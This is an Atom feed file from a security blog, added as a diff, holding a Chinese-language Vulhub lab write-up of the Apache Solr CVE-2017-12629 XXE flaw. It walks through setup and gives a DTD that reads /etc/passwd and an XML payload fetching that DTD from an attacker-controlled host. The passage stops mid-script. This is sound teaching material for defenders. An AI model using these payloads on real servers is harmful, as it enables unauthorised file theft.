@@ -1,0 +1,274 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://bae-ace.github.io</id>
+    <title>bae的博客 • Posts by &#34;vulhub&#34; tag</title>
+    <link href="https://bae-ace.github.io" />
+    <updated>2025-08-01T09:54:17.000Z</updated>
+    <category term="Web安全" />
+    <category term="Solr" />
+    <category term="XXE" />
+    <category term="漏洞复现" />
+    <category term="Vulhub" />
+    <category term="Kali" />
+    <category term="PHP" />
+    <category term="SSRF" />
+    <category term="PWN" />
+    <category term="ELF" />
+    <category term="ROP" />
+    <category term="CTF" />
+    <category term="二进制安全" />
+    <category term="工具" />
+    <category term="sqlmap" />
+    <category term="渗透测试" />
+    <category term="SQL注入" />
+    <category term="网络安全" />
+    <category term="ThinkPHP" />
+    <category term="RCE" />
+    <category term="Struts2" />
+    <category term="OGNL注入" />
+    <category term="hexo" />
+    <category term="博客搭建" />
+    <category term="初始测试" />
+    <category term="linux" />
+    <category term="命令" />
+    <category term="命令执行" />
+    <category term="漏洞利用" />
+    <category term="信息收集" />
+    <category term="子域名" />
+    <entry>
+        <id>https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/</id>
+        <title>Apache Solr CVE-2017-12629 XXE 漏洞复现与利用（基于 Vulhub）</title>
+        <link rel="alternate" href="https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/"/>
+        <content type="html">&lt;h1 id=&#34;深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）&#34;&gt;&lt;a href=&#34;#深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）&#34; class=&#34;headerlink&#34; title=&#34;深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）&#34;&gt;&lt;/a&gt;深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;CVE-2017-12629&lt;/strong&gt; 是一个影响 Apache Solr 的 **XML 外部实体注入（XXE）**漏洞，允许攻击者通过构造恶意的 XML 输入，加载外部实体或敏感文件，从而导致信息泄露或进一步攻击。该漏洞难度中等偏上，需要结合远程 DTD（文档类型定义）加载和外带技术进行利用。本文基于 &lt;strong&gt;Vulhub&lt;/strong&gt; 靶场和 &lt;strong&gt;Kali Linux&lt;/strong&gt; 环境，详细复现该漏洞，涵盖环境搭建、原理分析、利用流程及防护建议，旨在帮助安全从业者深入理解 XXE 漏洞的危害与利用方式。&lt;/p&gt;
+&lt;p&gt;本文将重点讲解：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;漏洞触发原理及利用链&lt;/li&gt;
+&lt;li&gt;远程 DTD 构造与外带攻击&lt;/li&gt;
+&lt;li&gt;完整的攻击请求构造与验证&lt;/li&gt;
+&lt;li&gt;防护措施与注意事项&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;二、漏洞概述&#34;&gt;&lt;a href=&#34;#二、漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞概述&#34;&gt;&lt;/a&gt;二、漏洞概述&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;漏洞编号&lt;/strong&gt;：CVE-2017-12629&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;：XXE（XML External Entity Injection）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;影响版本&lt;/strong&gt;：Apache Solr &amp;lt; 7.1.0&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;测试平台&lt;/strong&gt;：Vulhub + Kali Linux&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;难度&lt;/strong&gt;：中等偏上（需构造远程 DTD 和外带攻击）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;危害&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;读取服务器敏感文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;触发内网资源访问，潜在导致 SSRF&lt;/li&gt;
+&lt;li&gt;结合其他漏洞进一步提权或控制服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;三、环境搭建&#34;&gt;&lt;a href=&#34;#三、环境搭建&#34; class=&#34;headerlink&#34; title=&#34;三、环境搭建&#34;&gt;&lt;/a&gt;三、环境搭建&lt;/h2&gt;&lt;h3 id=&#34;1-前提准备&#34;&gt;&lt;a href=&#34;#1-前提准备&#34; class=&#34;headerlink&#34; title=&#34;1. 前提准备&#34;&gt;&lt;/a&gt;1. 前提准备&lt;/h3&gt;&lt;p&gt;确保以下环境已就绪：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络配置&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;NAT 模式（访问外部网络）&lt;/li&gt;
+&lt;li&gt;仅主机模式（Host-Only，Kali IP：&lt;code&gt;192.168.56.1&lt;/code&gt;，靶机 IP：&lt;code&gt;192.168.56.102&lt;/code&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;已安装 Docker 和 Docker Compose&lt;/li&gt;
+&lt;li&gt;Burp Suite（用于抓包和构造请求）&lt;/li&gt;
+&lt;li&gt;Python3（用于托管 DTD 文件）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：Vulhub 的 Apache Solr CVE-2017-12629 环境&lt;ul&gt;
+&lt;li&gt;访问地址：&lt;code&gt;http://192.168.56.102:8983/solr/#/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;确保靶场已成功部署（参考 Vulhub 官方文档或前文）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-启动-Vulhub-靶场&#34;&gt;&lt;a href=&#34;#2-启动-Vulhub-靶场&#34; class=&#34;headerlink&#34; title=&#34;2. 启动 Vulhub 靶场&#34;&gt;&lt;/a&gt;2. 启动 Vulhub 靶场&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;克隆 Vulhub 项目（若未下载）：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/solr/CVE-2017-12629&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;启动 Docker 容器：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;验证环境：&lt;ul&gt;
+&lt;li&gt;访问 &lt;code&gt;http://192.168.56.102:8983/solr/#/&lt;/code&gt;，若看到 Solr 管理界面，说明部署成功 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;管理容器：&lt;ul&gt;
+&lt;li&gt;查看容器：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker ps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;停止容器：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose down&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;四、漏洞原理&#34;&gt;&lt;a href=&#34;#四、漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;四、漏洞原理&#34;&gt;&lt;/a&gt;四、漏洞原理&lt;/h2&gt;&lt;h3 id=&#34;1-XXE-漏洞简介&#34;&gt;&lt;a href=&#34;#1-XXE-漏洞简介&#34; class=&#34;headerlink&#34; title=&#34;1. XXE 漏洞简介&#34;&gt;&lt;/a&gt;1. XXE 漏洞简介&lt;/h3&gt;&lt;p&gt;XXE（XML External Entity Injection）是一种 XML 解析器漏洞，攻击者通过注入恶意 XML 实体，诱导解析器加载外部资源（如本地文件或远程 DTD），从而实现文件读取或网络请求。Apache Solr 的查询接口允许用户提交 XML 格式的参数，且未禁用外部实体解析，导致 XXE 漏洞。&lt;/p&gt;
+&lt;h3 id=&#34;2-漏洞触发点&#34;&gt;&lt;a href=&#34;#2-漏洞触发点&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞触发点&#34;&gt;&lt;/a&gt;2. 漏洞触发点&lt;/h3&gt;&lt;p&gt;Solr 的漏洞入口位于以下接口：&lt;/p&gt;
+&lt;figure class=&#34;highlight dts&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;/solr/&lt;/span&gt;demo/select?q=&lt;span class=&#34;hljs-params&#34;&gt;&amp;lt;XML_Payload&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;wt&lt;/span&gt;=xml&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;defT&lt;span class=&#34;hljs-attr&#34;&gt;ype&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;xmlparser&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;q&lt;/code&gt;：查询参数，接受 XML 格式的输入。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wt=xml&lt;/code&gt;：指定响应格式为 XML。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;defType=xmlparser&lt;/code&gt;：启用 XML 解析器，触发 XXE。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-漏洞限制&#34;&gt;&lt;a href=&#34;#3-漏洞限制&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞限制&#34;&gt;&lt;/a&gt;3. 漏洞限制&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;无回显&lt;/strong&gt;：Solr 不直接回显实体内容（如 &lt;code&gt;/etc/passwd&lt;/code&gt;），需通过外带（Out-of-Band, OOB）技术利用。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;外带攻击&lt;/strong&gt;：通过构造远程 DTD，诱导 Solr 访问攻击者控制的服务器，从而间接读取目标文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-利用链&#34;&gt;&lt;a href=&#34;#4-利用链&#34; class=&#34;headerlink&#34; title=&#34;4. 利用链&#34;&gt;&lt;/a&gt;4. 利用链&lt;/h3&gt;&lt;figure class=&#34;highlight crmsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs crmsh&#34;&gt;用户提交 &lt;span class=&#34;hljs-keyword&#34;&gt;XML&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Payload&lt;/span&gt; -&amp;gt; Solr &lt;span class=&#34;hljs-keyword&#34;&gt;XML&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;解析器解析 -&amp;gt; 加载远程 DTD&lt;/span&gt; -&amp;gt; 引用本地文件（如 /etc/passwd） -&amp;gt; 外带至攻击者服务器&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;五、漏洞利用流程&#34;&gt;&lt;a href=&#34;#五、漏洞利用流程&#34; class=&#34;headerlink&#34; title=&#34;五、漏洞利用流程&#34;&gt;&lt;/a&gt;五、漏洞利用流程&lt;/h2&gt;&lt;h3 id=&#34;1-初步访问与抓包&#34;&gt;&lt;a href=&#34;#1-初步访问与抓包&#34; class=&#34;headerlink&#34; title=&#34;1. 初步访问与抓包&#34;&gt;&lt;/a&gt;1. 初步访问与抓包&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;配置 Burp Suite：&lt;ul&gt;
+&lt;li&gt;打开 Burp Suite，设置代理（默认：&lt;code&gt;127.0.0.1:8080&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;配置 Firefox 浏览器使用 Burp 代理。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;访问 Solr 管理界面：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.102&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8983&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/solr/&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#/&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;在 Burp 中拦截请求，观察典型 GET 请求：&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/solr/&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.56.102:8983&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html,application/xhtml+xml,application/xml;q=0.9&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;2-构造远程-DTD-文件&#34;&gt;&lt;a href=&#34;#2-构造远程-DTD-文件&#34; class=&#34;headerlink&#34; title=&#34;2. 构造远程 DTD 文件&#34;&gt;&lt;/a&gt;2. 构造远程 DTD 文件&lt;/h3&gt;&lt;p&gt;由于 Solr 不回显文件内容，需通过外带攻击加载远程 DTD。&lt;/p&gt;
+&lt;h4 id=&#34;步骤：&#34;&gt;&lt;a href=&#34;#步骤：&#34; class=&#34;headerlink&#34; title=&#34;步骤：&#34;&gt;&lt;/a&gt;步骤：&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;在 Kali（IP：&lt;code&gt;192.168.56.1&lt;/code&gt;）上创建 DTD 文件 &lt;code&gt;test1.dtd&lt;/code&gt;：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dtd&#34;&gt;&amp;lt;!ENTITY % passwd SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;!ENTITY % err &amp;quot;&amp;lt;!ENTITY errmsg SYSTEM &amp;#x27;file:///etc/passwd&amp;#x27;&amp;gt;&amp;quot;&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;strong&gt;说明&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;%passwd&lt;/code&gt;：定义实体，尝试读取目标服务器的 &lt;code&gt;/etc/passwd&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%err&lt;/code&gt;：嵌套实体，构造 &lt;code&gt;errmsg&lt;/code&gt; 引用 &lt;code&gt;%passwd&lt;/code&gt;，便于在 XML 中调用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;将 &lt;code&gt;test1.dtd&lt;/code&gt; 放入 Kali 的 HTTP 目录（如 &lt;code&gt;/var/www/html/&lt;/code&gt;）：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cp&lt;/span&gt; test1.dtd /var/www/html/&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;启动 HTTP 服务：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;python3 -m http.server 80&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+确保 DTD 可通过以下地址访问：&lt;figure class=&#34;highlight dts&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;http:&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.1/test1.dtd&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;3-构造-XML-Payload&#34;&gt;&lt;a href=&#34;#3-构造-XML-Payload&#34; class=&#34;headerlink&#34; title=&#34;3. 构造 XML Payload&#34;&gt;&lt;/a&gt;3. 构造 XML Payload&lt;/h3&gt;&lt;p&gt;创建以下 XML Payload，引用远程 DTD：&lt;/p&gt;
+&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;hljs-keyword&#34;&gt;root&lt;/span&gt; [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;hljs-keyword&#34;&gt;remote&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.1/test1.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  %remote;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  %err;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;&amp;amp;errmsg;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;说明&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://192.168.56.1/test1.dtd&amp;quot;&amp;gt;&lt;/code&gt;：加载远程 DTD。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%remote;&lt;/code&gt;：执行 DTD 中的定义。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%err;&lt;/code&gt;：触发嵌套实体，尝试加载 &lt;code&gt;/etc/passwd&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;errmsg;&lt;/code&gt;：引用嵌套实体，诱导 Solr 解析。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-URL-编码-Payload&#34;&gt;&lt;a href=&#34;#4-URL-编码-Payload&#34; class=&#34;headerlink&#34; title=&#34;4. URL 编码 Payload&#34;&gt;&lt;/a&gt;4. URL 编码 Payload&lt;/h3&gt;&lt;p&gt;由于 Payload 将通过 GET 参数 &lt;code&gt;q&lt;/code&gt; 提交，需进行 URL 编码。使用 Python 脚本生成编码后的 Payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib.parse&lt;br&gt;&lt;br&gt;payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;lt;!DOCTYPE root [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;  &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://192.168.56.1/test1.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;  %remote;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;  %err;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span 